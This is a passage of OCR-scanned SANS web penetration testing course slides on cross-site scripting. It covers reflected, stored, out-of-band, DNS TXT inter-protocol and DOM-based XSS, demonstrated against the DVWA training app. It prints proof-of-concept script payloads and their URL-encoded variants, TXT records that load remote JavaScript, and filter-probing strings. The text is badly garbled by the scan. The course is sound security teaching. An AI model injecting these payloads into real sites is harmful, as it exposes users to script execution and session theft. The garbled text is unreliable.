</to rm> 
<pn,>Hel lo jzaphodt/pre> 
</div> 
http://dvwa/vulnerabilities/xss_r/?name~Zaphodij 
41 
The target URL we are exploring is http: //dvwa/vulnerabilities/xss_r. 
The page presents a simple form to which we supply a benign and expected style of input using the string, 
Zaphod. 
What's your name? 
IZaphod 
ii Subilrit l 
This results in our input are reflected back to us in the application's response. Our input is found in both the 
HTML source code as well as being directly visible in the rendered page and as a URL query parameter. 
v<div class=" 
v <form name="XSS" action=",t" method="GET"> 
<p>What's your name?</p> 
<input name=·name• type="text"> 
<input value="Submit" type="submit"> 
</form> 
< p ree-He ll o Za pnod« /pre» 
</div> 
What's your name? 
Hello Zaphod 
The task now is to interact with the application and determine ifwe can supply input that allows execution. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
47 
'-../ 
\...../ 
'--' 
Reflected XSS-lnitial ......... _ 
Target:http://dvwa/vulnerabilities/xss_r/ 
XSS Form 
Inject: <script>alert ( 42) ;</ script> 
42 
Alert box displayed 
Input again dynamically added to 
the HTML without any encoding 
<div 
<form name="XSS" action"'"ir" mett10d="GET"></form> 
v,q:ire> 
</div> 
http://dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%2842%29%3B%3C%2Fscript%3E# 
-
-,~""~ S'\'F' SS:'.''~ }---,,, --"'==c'~ ~= 
\...../ 
'-..,I
'-..,I 
'-..,I 
..__, 
'-..,I 
\...../ 
'-..,I 
'-..,I 
'-..,I 
'-..,I 
'-../ 
..__, 
Target: http: //dvwa/vulnerabilities/xss_r/ 
XSS Form Inject: <script>alert (42) ;</script> 
This results in an alert box being displayed 
42 
Our input is again dynamically added to the HTML. Notably, we find our raw input without any encoding or 
filtering within the source code. 
- .. <div class"'"vulnerab1.e code area"> 
; <form name="XSS" action="!" method="GET"></fonri> 
•<pre> 
Hello 
( <script>a tert ( 42); </sc npt>) 
-e/pre» 
</div> 
Note also our input, in an encoded fashion, in the address bar. 
http://dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%2842%29%3B%3C%2Fscript%3E# 
48 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..,I 
.'-..,I 
'-../ 
'-../ 
'-..,I 
'-..,I 
'-..,I 
'-..,I 
'-..,I 
'-..,I 
'-../ 
'-../ 
'-../ 
'-../ 
'-..,I 
'-..,I 
'-../ 
'-..,I 
'-..,I 
'-..,I 
'-..,I 
'-../ 
'-..,I 
\...../ 
'-../ 
'-' 
Reflected XSS - Non-Persistent 
Another user fetching the base URL without submitting the inject would see the 
normal page 
• Even if we (as victim of the PoC alert (42)) navigate to the page later without the 
inject, the page will render normally too 
This illustrates the dynamic nature of Reflected XSS 
Payloads are immediately delivered to the victim, and will not persist for either 
the victim or other users 
To exploit a Reflected XSS flaw will require having the victim submit the attack 
payload to the vulnerable application for immediate reflection 
In the case of our example, recall the input was also set as the value of the 
query parameter name in the URL: 
http://dvwa/vulnerabilities/xss_r/?name=Zaphod 
Ifwe navigated to the original base page without again providing our script as input, we would simply find the 
normal uninjected page displayed. This would, of course, also be the case for any other users of the application. 
This highlights the dynamic and non-persistent nature of Reflected XSS flaws. 
While simpler to uncover, the exploitation of these flaws will, by nature, require any potential victims to submit 
our crafted payload to the vulnerable application. The particular flaw we have been working with presented as a 
URL query parameter, which will allow for a simple means of payload delivery that could lead to exploitation of 
the flaw. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
49 
'-.J 
'--.-I 
'--.-I 
Refl.ectedXSS. - .URL Encoding 
Rather than manually submitting the parameter via the form, let's craft a link 
to see if we could perhaps use that to send to a victim 
Normal URL: http: //dvwa/vulnerabilities/xss_r/?name=Zaphod 
XSS Inject: <script>alert {42) ;</script> 
Resultant URL: 
//dvwa/vulnerabilities/xss_r/?name=<script>alert(42) ;</script 
As this will be entered manually as part of the URI, we should get in the habit 
of URL Encoding {Percent Encoding) data before injecting query params 
Note: Some tools will automatically try to encode properly if we are using 
them to perform the submission 
•••••••c.cc•L•·~- 
'-' 
'-' 
'-.J 
'-.J 
'-.J 
'-../ 
'-../ 
'-' 
'-../ 
'-../ 
'-.J 
'-.J 
'-' 
'-' 
'-.J 
Proper encoding is a strong mechanism for web application security. Output encoding provides one of the best 
ways to actually defeat XSS attacks like those we are exploring. And while they prove effective for the 
defenders, they also play an extremely important role for us trying to attack web applications as well. 
Encoding serves as one of the more important approaches to defeating blacklist, or even some whitelist, style 
filters. Though encoding provides an opportunity for potential filter bypass, it also plays an important role in 
properly interacting with applications to send input that can be handled properly (or improperly handled in 
advantageous to us ways). 
URL Encoding, which is more descriptively sometimes also called Percent Encoding, plays an important role 
for us. Since we are manually crafting data to be passed as values to URL query parameters in this Reflected 
XSS attack, we will need to employ URL encoding prior to submitting our data. 
Normal URL: http://dvwa/vulnerabilities/xss_r/?name=Zaphod 
XSS Inject: <script>alert (42) ;</script> 
We always need to be mindful of the proper encoding the application expects to receive given our input. Let's 
look at a few different ways that we can manually URL encode the injection we want to perform. 
50 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'-../ 
'-' 
'-../ 
'-.J 
'-' 
'-../ 
'-.J 
'-' 
'-' 
'-.J 
'-' 
'-' 
'-.J 
'-../ 
'-../ 
'-..../ 
'-..../ 
"-' 
'-.J 
'-.J 
'-J 
Encoding URl..s: Burp Decoder 
Burp Decoder 
Note: Burp encodes 
all characters, even 
URLSafe characters, 
which can prove a 
useful behavior 
3 
Naturally, Burp has the ability to URL encode data by using the Decoder tool within Burp Suite. 
You will notice in the screenshot that Burp Decoder encodes all characters, even URLSafe characters, which 
can prove a useful behavior 
Note that Burp can also automatically encode data that is being sent through some of the more automated tools. 
For instance, in Burp Intruder. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
51 
'-/ 
'-/ 
'--' 
Encoding URLs: Burp Intruder 
Burp Intruder 
• 
This setting can be used to URL-encode selected characters within the final 
payload, for safe transmission within HTTP requests. 
URL-encode these characters: 1-/\=<>?+&*;: 
I • 
'--' 
'--' 
'-J 
'-..../ 
'-' 
'-' 
'-J 
'-J 
'--' 
'-J 
\,__..., 
'-.J 
'-/ 
'-J 
When using some parts of the Burp Suite, there can be options for automatically encoding some types of data. 
For instance, Burp Intruder provides that functionality as an option that is currently set on by default. 
• 
- 
This setting can be used to URL-encode selected characters within the final 
payload, for safe trensrnlsslon within HTTP requests. 
~ URL-encode these characters:! -1\=<>?+&*;: 
I ~--·----11111 
As can be seen in the screenshot, we can alter the characters that are automatically encoded. 
52 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
'--' 
\_J 
'-/ 
'-/ 
'-/ 
'--' 
'--' 
'--' 
\,__..., 
'-J 
'--' 
'--' 
'--' 
'--' 
'--' 
'-' 
'--' 
'-../ 
'-J 
'-..../ 
'--' 
'-J 
'-' 
'--'. 
'---' 
Encoding URLs: ZAP 
ZAP-> Tools-> Encode/Decode/Hash 
Raw Payload: 
<script>alert(42) ;</script> 
Encoded Payload: 
%3Cscript%3Ealert%2842%29%3B%3C%2Fscript%3E 
Note: Unlike Burp, ZAP does not perform the, in this 
instance, unnecessary encoding of the alphanumeric 
characters 
SEC542 f Web App Penetration Testing and Ethical Hacking 
53 
ZAP's Encode/Decode/Hash tool provides us with the ability to manually URL encode data on an as-needed 
basis. 
fnc<>d~t~,l>!le/llasl! 
codadfd!!codedihashiMl 
- + X 
Raw Payload: 
<script>alert(42) ;</script> 
Encoded Payload: %3Cscript%3Ealert%2842%29%3B%3C%2Fscript%3E 
As can be seen from the payload, unlike Burp, which URL encoded every single character provided, ZAP only 
appears to URL encode the characters the tool considers to be unsafe. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
53 
'---' 
Encoding URLs: Firefox Web Console + JavaScript 
Firefox-> j ,i, I-> I ,!:w I (Developer Tools)-> Web Console 
KB Shortcut: 
(PC: Ctrl + Shift + K) 
(Mac: Cmd + Opt + K) 
------------ 
) ; 
) 
,'I 
I 
I 
Type Code Here 
Encoding a parameter, the function encodeURIComponent () will be used 
If passing an entire URL, then encode URI () would be used instead 
'---' 
'-._,I
'-J 
'-J 
etration Testing and Ethicaf Hackin)?; 
The JavaScript Console found in the Firefox Web Console gives us an interesting way to send our properly 
encoded data while still within the browser. 
We can open the Firefox Web Console via the options hamburger [!;] followed hy the Developer wrench, I o!:.-1 
and then select Web Console. 
KB Shortcut: (PC: Ctrl + Shift + K) 
(Mac: Cmd + Opt + K) 
( 
( 42) ; 
) 
54 
Type Code Here 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'-J 
'-J 
'--' 
'---' 
'---' 
'-._, 
'-J 
'---' 
'---' 
'-J 
'--' 
'-J 
'---' 
'---' 
'-" 
'-J 
'---' 
'-J 
'-J 
'---' 
'--' 
"-.,," 
'---' 
'---' 
'-J 
'--' 
'--' 
'---' 
'---' 
'-J 
'-J 
'---' 
'-..,I 
'--' 
'-../ 
Reflected XSS - Encoded Inputs 
Now let's test inject the different URL encoded payloads produced 
http://dvwa/vulnerabilities/xss_r/?name={script>alert(42) ;</script>, 
I 
Burp Encoded Payload: 
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74 
%28%34%32%29%3b%3c%2f%73%63%72%69%70%74 
%3e 
ZAP Encoded Payload: 
%3Cscript%3Ealert%2842%29%3B%3C%2Fscript%3E 
42 
Firefox: Web Console Encoded Payload: 
%3Cscript%3Ealert(42)%3B%3C%2Fscript%3E 
Interestingly, each encoding technique produced a unique encoded output. While this might seem a bit 
disconcerting at first, note that the only differences were in what characters were left unencoded. 
As discussed previously, the Burp Decoder encoded every single character, even the alphas. Although it was 
unnecessary in this case, there might well be times when we avail ourselves of this feature. 
More important will be whether each of the uniquely encoded strings produces the exact same alert box. Most 
important will be whether the alert box shows up at all. 
Burp Encoded Payload: 
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%34%32%29%3b%3c%2f%73%63%72%69%70 
%74%3e 
ZAP Encoded Payload: %3Cscript%3Ealert%2842%29%3B%3C%2Fscript%3E 
Firefox: Web Console Encoded Payload: 
%3Cscript%3Ealert(42)%3B%3C%2Fscript%3E 
Though the payloads might have looked different they all produced 
the exact same resultant pop-up. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
55 
'--' 
StoredXSS 
Persistent, or Stored XSS, represents the other major type of 
XSS flaw typically relevant to every application assessment 
• As with "Reflected," the names used for this class of flaw are illustrative 
The defining characteristic is that when Stored XSS flaws are 
exploited, the adversary's input will persist across additional 
interactions with the site 
We exploit a Stored XSS flaw submitting our maliciously crafted 
input a single time, but this single input could impact millions of 
users 
• Contrast this with Reflected XSS, which to exploit multiple users would 
require, for example, sending an email with crafted link to each victim 
'4~·:/c"iS'"-'ffiSSCCfi _'_~-s-'.S;')"': 
'i'''"~~~._,..,z,~,~= 
'---'
'---' 
'-" 
'---' 
'-.., 
'---'
\_; 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
Data persistence is the defining characteristic of Stored XSS. It is none too surprising that this flaw might well 
also be referred to as Persistent XSS. The data persistence is unlike Reflected XSS, which requires the victim to 
be tricked into submitting our maliciously crafted payload to the vulnerable application. 
Though more difficult to discover, Stored XSS flaws will often have a wider reach due to the attack payload 
being embedded within the site for others to stumble upon. Not being reliant upon successful social engineering 
of the victim also makes things more stable for us. 
56 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'-.../ 
'-.../
'---'
'-" 
'-.../ 
'-" 
'-" 
'--' 
'-.../ 
'---'
'---'
'---'
'-.../
'-..../
'-..../
'-..../ 
\_; 
'-./
'-.../
'-" 
'-" 
'-.../
'-../ 
'-.../ 
'-../
Stored XSS: Persistent Input 
With Stored XSS, we need to inject user-controllable input that will persist and 
be accessible to other users of the application 
Common application functions with increased likelihood of Stored XSS flaws: 
• Blog comments 
• Forum data 
• Messaging functionality 
• Log mechanisms 
• Account profile information 
• Support functionality 
Major theme: Any aspect of the application that facilitates communicating 
information to users or admins is especially pertinent 
SEC542 JWeb App Penetration Testing and Ethical Hacking 
57 
To discover Stored XSS flaws requires us to consider all the ways in which we might impact the application 
over time. ln addition to the persistence consideration, we also would need to think about how and whether any 
other users of the application will be able to encounter the persistent data we can inject. 
While not anywhere approaching an exhaustive list, the collection below highlights some commonly 
encountered functionality that can, by nature, be more likely to exhibit characteristics of persistence than most. 
• 
Blog comments 
• 
Forum data 
• 
Messaging functionality 
• 
Log mechanisms 
• 
Account profile information 
• 
Support functionality 
Always be on the lookout for something you can see that another user has created within applications. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
57 
.'-...,/ 
'--' 
Out-of-Band Stored• XSS 
Typical expectation is that our persistent input will be observable within the 
same application 
Out-of-band XSS variants involve indirectly supplying input that results in 
JavaScript executing within a web application 
• We might not even have the ability to interact with the vulnerable application 
Applications with more obvious OOB Stored XSS potential: 
• Web-based email clients 
• Security device consoles (IDS, SIEM, Firewall, etc.) 
Consider any application where out-of-band information we control has a high 
likelihood of being rendered in a, preferably known, web application or console 
'-" 
''---' 
'-...,/ 
.___,, 
'-' 
'-' 
'-' 
'-...,/ 
'-' 
'-" 
'-' 
'-' 
'-' 
Web applications are absolutely ubiquitous on both internal networks and the Internet. While a bit odd to 
consider on the surface, we will now be talking about potentially exploiting a web application flaw in which we 
never actually interact with the vulnerable application directly. Wait, what??? That sure sounds strange. What 
we are talking about is Out-of-Band (008) Stored XSS. 
OOB Stored XSS presents like typical Stored XSS attacks to the victim. The rather distinct difference is that we, 
the attacker, will get that Stored XSS payload into the vulnerable web application without directly interacting 
with the app itself. Effectively, we are indirectly presenting malicious input via another modality. 
Some types of applications stand out as being more likely susceptible to OOB Stored XSS style indirection: 
• 
Web-based email clients 
• 
Web application administrative consoles 
• 
Security appliance web consoles 
Applications that render significant content under which we exert quite a bit of control are worthy of 
consideration. Strong preference would be for consoles which might have known vulnerabilities or those that we 
can test in a lab to perfect our OOB payload. 
'-" 
'-" 
.___,, 
'-' 
'-' 
'-" 
'-" 
'-" 
'-' 
'-" 
'-...../ 
'-' 
'-./ 
'-" 
'-" 
'--' 
'-" 
.___,, 
'-" 
'-' 
'-' 
'-./ 
'-" 
'-../ 
58 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-" 
Stored XSS Illustrated: Benign Input 
Form Input 
+ 
u:l Console 
D Debugger 
{ } Style Editor 
1 of 1 
<: lifeforms 
> <dlv 1.d~"'gm:stbook __ -u::rn}:ri_entS."></d1v> 
Perferma., 0 
0 tJ'"" 
181 
Name: Marvin 
<trr> 
Mess;,ge: This the sort of thing you lifeforms enJoy. is it? 
Injected Input 
Results in both 
immediate and 
delayed reflection 
Name: test 
Message: This is a test oormnent. 
.:::/div> 
<br> 
Here we will encounter a Stored XSS flaw. This flaw exists within the Guestbook function of the DVWA web 
application. 
Name• 
I 
I 
fr111s the sort Of thing you life!onns e-1joy, is it? 
~ 
Form Input 
I 
Message• 
Q 
+ 
El Console D Debugger {} Style Editor @ Performa.; O 
1 of 1 
llfeforms 
O v"'- 
!Bl 
<r!'"br., 
Message: This the sort of thing you Ufoforms enjoy, is it? 
</div> 
< net 
diWtmain_body 
divJmdy _padded 
Name: test 
Message: This is a test comment 
Name: Marvin 
Message; This the sort of thing you 
lifeforms enjoy, is it? 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
59 
'-..../ 
'--' 
Stored XSS Illustrated:. Injected PoC 
PoCinject:<script>alert(42) ;</script> 
Name• 
,0123456789 
Message• 
txtName input has a 
ti 
I 
maxlength=" 10" set 
Console 
{ 
Editor 
+ 
-cur-> 
42 
<div 
<div 
llama: 
611154561<19 
'--' 
'--' 
'-..../ 
'--' 
'--' 
'--' 
'--' 
'--' 
'-..../ 
'--' 
'--' 
'--' 
'-..../ 
'--' 
'-..../ 
'--' 
PoC Inject: <script>alert (42) ;</script> 
The Name portion of the form doesn't allow enough input for this PoC, but the Message does. 
Name• 
10123456700 
Message• 
,,,, 
"' 
txtName input has a 
maxlength= 111011 set 
Get a lovely little pop-up for our work, and see our script within the Web Console. 
'--' 
'--' 
'-..../ 
'-..../ 
'-../ 
\_; 
'--' 
'--' 
'--' 
'--' 
42 
Cormife 
Debuggsr 
{ 
Style Editor 
+ 
w<li1v ldw"guestnoot ,co-:nments"> 
!lamp: 012345678\! 
<tr> 
\_; 
'--' 
'--' 
'---,/ 
'-..../ 
\_; 
'-../ 
'---,/ 
'--' 
'---,/ 
\_; 
60 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'--" 
Inter-protocol Stored XSS I 
• Inter-protocol Stored XSS adds a twist to Stored XSS 
o The JavaScript originates from a different (non-web) protocol 
• This concept was demonstrated by Jamie Hankins when he added a TXT 
record containing JavaScript to thejamiehankins.co.uk DNS zone in 2014 
----------------------------1 
; ; QUESTION SECTION t 
1jam.i.ehankine~co.u.k. 
IN '!X'!' 
f t ANSwt.rt SEC'l'ION; 
jarnieban.k,i,.ns .. co. uk. 
:300 !N TXT "gQ-Ogl,¢-Gite-ve-r ifieat.i,on;;;nZUP4Bag,JAjQZ:06AlmXyzJ2tlXUf9•Ul'PDZ;i:-8; 
jarni~hankint .co, uk , 
jamien.ankins .co.ult. 
jamiehankins .ccvak, 
300 IN 'l'X'l' "V""SPfl ir..cludQ:apf.mandril.lapp.com ?all" 
300 lN '?¼'1' "'<script arce ' ! /:pen.iscorp.ccm/t.opkek. js '></,:c:ri:;;>t>" 
300 !N TX'I' "<iframe. 'Width,.,'420' heit!ht."*13-l.S' SZ'C""'/h.'W'.,.;,youtuhe.com/ewl>ed, 
• The JavaScript was triggered when a user looked up "jamiehankins.co.uk" at 
a DNS lookup website 
o It made the web page shake (the icons and images moved around), and originally played the 
"Harlem Shuffle" 
Tom's Guide reported on Jamie Hankin's Inter-protocol Stored XSS demonstration: 
Late last week, British programmer Jamie Hankins loaded a bit of JavaScript into his own website's 
metadata, specifically the TXT fields of the Domain Name Service (DNS) records. The result? When 
you type in "jamiehankins.co.uk" into the search fields of certain websites, the text starts shaking, 
music starts blaring and the entire page turns into a dance party ... 
Hankins' prank was first noticed on the Who.is domain lookup page, but the site was later fixed. 
However, as of Monday afternoon EDT, the prank still worked on a site called MxToolbox.com. 2 
Virtually every DNS lookup site on the Internet was vulnerable to this (harmless) demo on the day it debuted. 
Most have been fixed since, but some may remain. While the original TXT record has been taken down, a 
course author added the following to the domain "eej.me": 
; ; QUESTION SECTION: 
;eej.me. 
TXT 
; ; ANSWER SECTION: 
ee] .rse, 
1799 
TXT 
"<script sn:"' / /eej .me/shake. j s' ></script>" 
; ; Query time: Bi msec 
;; SERVER: 2001:4860:4860::8888#53(2001:4868:4860::8888) 
; ; WHEN: Wed nee 27 11: 27: 54 EST 1017 
; ; MSG SlZE 
rc11d: 89 
Orion:~ ericconrads I 
References: 
[ 1] https://www.reddit.com/r/programming/comments/2gs2c3/dns _ txt_record _ xss/cklyy4e/ 
(https://cyber.gd/542 _ 440) 
[2] https://www.tomsguide.com/us/harlem-shake-hack,news-19595.html (https://cyber.gd/542 _ 439) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
61 
'-" 
...._,, 
Inter-protocol ·.stored XSS]I 
• The JavaScript went from a DNS server (UDP port 53) to a DNS lookup 
website (such as MxToolbox.com) to a browser via port 80 or 443 
• Pictures and words cannot give the full effect justice, so the upcoming XSS lab 
will demonstrate this vulnerabili .. ,. 
- 
Web 
w, 
M = 
DNS Lookup Site 
• While simply a demo, an attacker could weaponize this by sending hook.js 
from the Browser Exploitation Framework (BeEF, discussed shortly) 
DNS Server 
o Then trick the victim into looking the DNS zone up via a web page 
'-.../ 
...._,, 
'-' 
...._,, 
'--'' 
'--'' 
...._,, 
'-.../
...._,, 
...._,, 
...._,, 
...._,, 
In the screenshots shown above, the JavaScript is stored on the primary name server for sec542.info. 
This server is running in the Security542 Linux VM, and currently contains a normal (non-JavaScript) TXT 
record ("42"). We will 'weaponize' this with JavaScript in the upcoming XSS lab. 
You may view this zone by typing: 
$ cat /etc/bind/zones/sec542.info.db 
The web browser connects to lookup site (http://sec542.org/dns) via HTTP (TCP port 80), and searches for 
"sec542.info". The server resolves the name via DNS (UDP port 53), and sends the results via HTTP back to the 
browser. The TXT record contains JavaScript, which is sent to the browser and executed as part of the DNS 
lookup site HTML: 
<section idc"txt" class-•main"> 
<div c\ass=·spotlighe> 
<div ctass=:1'content!,> 
<header class,.,jfmjor"> 
<h2> TXT Records</h2> 
</header:> 
<pxscript src-'~'></script> 
</diV> 
</div> 
</section> 
62 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
...._,, 
...._,, 
'-.../ 
...._,, 
'-' 
...._,, 
'-.../ 
'-'' 
'-.../ 
'-' 
..__,, 
''-.,./
'-.../ 
'-' 
'-' 
'-.../ 
'-J 
...._,, 
'-'' 
...._,, 
'-' 
'-.../ 
'-'' 
'-....,, 
'-' 
DOM Based XSS 
Now for something a little bit different ... 
DOM Based XSS, which can also be referred to as Type o XSS 
Still XSS, so some elements are the same ... 
• Exploitation still leads to JavaScript execution 
• Flaw still more overtly impactful to the client 
• Difficulty convincing many organizations of the importance 
Methods of discovery and exploitation of this class often closer to Reflected 
XSS than Stored 
• Most likely involves a dynamic request, non-persistent response, and social engineering 
Wait, I thought this was supposed to be a completely different class of XSS 
SEC5421 Web App Penetration Testing and Ethical Hacking 
63 
DOM Based XSS rounds out the final category ofXSS flaw we will be digging into. This one is a bit different 
even though many elements are similar to the traditional Reflected and Stored XSS already discussed briefly. 
We are still talking about an XSS flaw, so we would be attempting to achieve execution of JavaScript. The 
primary victim of DOM Based XSS is still the client. We also still will struggle to convince many organizations 
of the true impact. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
63 
I.._.; 
I.._.; 
DOM Based or Client XSS 
The distinguishing feature of DOM Based XSS is the client-side nature of the 
flaw 
• Server does not deliver attacker's JavaScript to the client 
• Rather, in rendering the client side of application, JavaScript execution can occur 
In traditional Reflected and Stored XSS, the goal was for adversary to get the 
server-side of the application to deliver our persistent or non-persistent 
JavaScript to the client 
• No such requirement for DOM Based 
Input leading to JavaScript execution might not even be delivered to the server- 
side of the application at all 
'--" 
'-./ 
'-----' 
'-./ 
'-----' 
'-----' 
'-./ 
\_, 
'-----' 
'-./ 
'-----' 
\_, 
'-./ 
'-----' 
The primary aspect of DOM Based XSS that makes it unique is that the XSS payload will not necessarily 
require already weaponized code from the server. The nature of the flaw is such that the JavaScript capable of 
being executed need not be delivered already weaponized from the server. Rather, it might only be made lethal 
by the client-side code leveraging benign content from the server. 
Truthfully, the content leading to JavaScript execution might not actually ever even make it to the server at all in 
some cases. 
64 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--" 
'-...__) 
\_, . 
'-../ 
'-../ 
'-' 
'-./ 
'---' 
'-'
'-.J 
'-./ 
'-" 
'-'
'-" 
'-' 
'-'
'-----'
'---' 
'-'
'-' 
'-----' 
'-'
'-' 
'-'
'-.J 
'-' 
Two Classes to Rule Them AU 
You will most commonly see reference to three classes ofXSS: Reflected, 
Stored, and DOM Based 
However, another way of classifying XSS flaws might be encountered that 
includes only two distinctions: Client XSS and Server XSS 
Non-Persistent 
Non-Persistent 
Persistent 
Persistent 
This classification scheme appreciates there can be both persistent and non- 
persistent versions of traditional and DOM Based XSS 
Don't think there is a right way to classify, but find it can be helpful for 
students and testers to understand/ appreciate both approaches to classification 
• And more importantly be able to explain them to clients and developers 
While the three-category representation of Reflected, Stored, and DOM Based still seems to be the most 
common, at present, another way of classifying XSS has started to come up with increasing regularity. This 
approach to classifying XSS has us think of the various XSS flaws as either Server XSS or Client XSS. 
Under this classification scheme the suggestion is presented in the following way: 
Persistent 
Persistent 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
65 
'-_.I 
'-_.I 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I.XXf 
2. Exercise: XXE 
J. Document Object Model (DOM) 
4. Cross-Site Scripting (XSS) Primer 
5. Classes ofXSS 
6. Exercise: XSS 
7. Discovering XSS 
8. XSS Impacts 
9. Exercise: HTML Injection 
IO. X:SS Tools 
Ii. BeEF 
12. Exercise: BeEf 
13.AJAX 
1 
I !t 
Attacks 
I 6. Exercise: AJAX XSS 
11. Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
66 
'-_.I 
'-' 
.___, 
'-_.I 
'-__.I 
'-' 
'-' 
.___, 
'-__.I 
'-' 
'-" 
.___, 
'-' 
.___, 
'-__.I 
.___, 
'-..,I 
Course Roadmap 
'-..,I 
'-.J 
Let's perform XSS hands-on. 
'-__.I 
.___, 
.___, 
'-.J 
'-.J 
'-" 
'-" 
.___, 
'-" 
'--' 
.___, 
.___, 
'--' 
"--' 
'-__.I 
66 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-__.I 
'-__.I 
SEC542 Workbook: XSS 
. -=- 
Exercise 4.2: XSS 
SEC542 Workbook: XSS 
Please go to Exercise 4.2 in the 542 Workbook. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
67 
'---' 
'---' 
'---' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXE andXSS 
I.XXE 
2. Exercise: XXE 
3. Document Object Model (DOM) 
4. Cross-Site Scripting (XSS) Primer 
5. Classes of XSS 
6. Exercise: XSS 
7. Discovering XSS 
8. XSS Impacts 
9. 11-.,,,.,,..,,.,.,. HTML Injection 
IL 
12. Ex,erdse: BeEF 
l.AJAX 
API Attacks 
15. Data Attacks 
16. Exercise: AJAX XSS 
17.Summary 
SEC542 I Web App Penetration Testing and l:thical Hacking 
68 
\._.,I 
'---' 
'-' 
'-" 
'-' 
'-' 
'-" 
'-' 
'-' 
'-" 
--.J 
'----' 
'-../ 
'-' 
Course Roadmap 
'----' 
The next section describes approaches to discovering XSS flaws. 
68 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'----' 
'-../ 
'----' 
'-../ 
'-' 
'-' 
'-' 
--.J 
'---' 
'-' 
'-' 
'----' 
'-' 
'-' 
'---' 
\.J 
'-./ 
XSS Discovery 
What do we submit in our attempts to discover XSS flaws? 
XSS fuzzing approaches and payload types: 
• Reflection tests: Simple but unique strings to determine if input is 
reflected back: 42424242 
• Filter tests: Determine what characters get filtered or encoded: 
<>()=' "/; [] { }$--#&// 
• PoC payloads: These payloads attempt to prove the XSS flaw exists: 
<script>alert(42) ;</script> 
Having seen some of the potential injection points for XSS, we have a sense for some of the places where we 
will inject. Now we tum to what we might inject at those various locations. 
We refer to the items that we inject as payloads, though admittedly different tools employ different terminology. 
Types of payloads that we might want to employ in our XSS discovery fuzzing include reflection tests, filter 
tests, and PoC payloads. 
Reflection tests employ a simple unique string that is injected. The goal of the reflection test is to find evidence 
of the data submitted being found within the application, for example, by injecting a payload of 42424242 into 
various inputs. We would not expect 42424242 to be naturally occurring within the application, so ifwe see 
evidence of that pattern in response traffic, then it seems likely that our supplied input is returned as part of the 
application. In its simplest form - the reflection test payload immediately being presented in the response - this 
test indicates a potential Reflected XSS vulnerability. However, this payload might also be found in locations 
other than the immediate response traffic. 
Filter tests, which could be performed after a positive response for a reflection test, can help us determine 
whether and what type of filtering or encoding is employed by the application. Understanding the types of 
filtering can assist with our eventual attempts at filter bypass. 
PoC payloads are what most people expect when thinking about fuzzing for vulnerability discovery. These 
payloads attempt to serve as a simple PoC to show that the XSS vulnerability is present. Further weaponization 
occurs during the exploitation phase, but a successful PoC is sufficient at the discovery phase of our 
methodology. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
69 
'--' 
'__,I 
XSS Injection Points 
Any user-controllable application input could prove vulnerable 
Common entry points such as: 
• URL query parameters 
• POST parameters 
• HTIP Headers 
o User-Agent 
o Referer 
o Cookies 
14242424242421 
/ 
For initial input, we submit an innocuous but unique string that 
allows us to easily identify when our input lands in the response 
SEC542 I Web App Penetration Testing and Ethical Hacking 
10 
'--' 
\.J 
'---' 
'--' 
'--' 
'--' 
'--..., 
'----' 
'--' 
'---' 
'-.../ 
'--' 
'--' 
\.J 
'-..,I 
'--' 
Even though XSS does present a dramatically different style of injection or input attack than we have seen with 
command injection, SQL injection, File Inclusion, and others, the fact remains that Cross-Site Scripting still 
presents as an input flaw. For our initial discovery and interaction then we will need to look to the enumeration 
of inputs that we have already performed. 
One significant tweak to the approach to our injection is that we will be focused heavily on input that ultimately 
becomes, whether in a Non-Persistent (Reflected XSS) or Persistent (Stored XSS) manner. Effectively, any 
user-controllable input could provide a viable avenue for submitting input that could be dynamically made part 
of the application's response. 
Though of course not an exhaustive list, common entry points include: 
• 
URL query parameters 
• 
POST parameters 
• 
HTTP Headers 
• 
User-Agent 
• 
Referer 
• 
Cookies 
70 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'----' 
'----' 
'-.../ 
'----' 
'---' 
'-' 
'-' 
'-.../ 
'--' 
'----' 
'-' 
'--' 
'-../ 
'---' 
'---' 
'-.../ 
'-../ 
'---' 
'----' 
'---' 
'-../ 
'-' 
'--- 
Reflection Tests: Unique String Injection 
Due to the dynamic nature of Reflected XSS, we could simply submit our test 
string and look at the immediate response to identify reflected input 
• Probing for Stored XSS proves a bit more cumbersome 
